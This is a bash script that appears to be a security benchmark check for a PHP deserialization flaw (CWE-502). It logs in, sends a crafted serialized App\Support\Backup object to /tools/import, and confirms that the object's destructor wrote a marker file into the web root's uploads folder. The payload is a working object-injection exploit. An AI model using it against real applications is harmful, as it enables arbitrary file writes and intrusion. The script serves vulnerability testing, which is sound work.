#!/usr/bin/env bash
# DESER-001 (CWE-502): a serialized App\Support\Backup object reaches
# unserialize(), whose __destruct writes an attacker-chosen file to the web root.
set -eu
. "$(dirname "$0")/_lib.sh"
login user1@bench.local User123!
RAND="$RANDOM$RANDOM"
DEST="/var/www/html/public/uploads/deser_$RAND.txt"
MARK="DESER-RCE-$RAND"
PAYLOAD="O:18:\"App\\Support\\Backup\":2:{s:4:\"path\";s:${#DEST}:\"$DEST\";s:8:\"contents\";s:${#MARK}:\"$MARK\";}"
post /tools/import -d "mode=php" --data-urlencode "data=$PAYLOAD" >/dev/null
sleep 1
curl -s "$TARGET/uploads/deser_$RAND.txt" | grep -qF "$MARK"
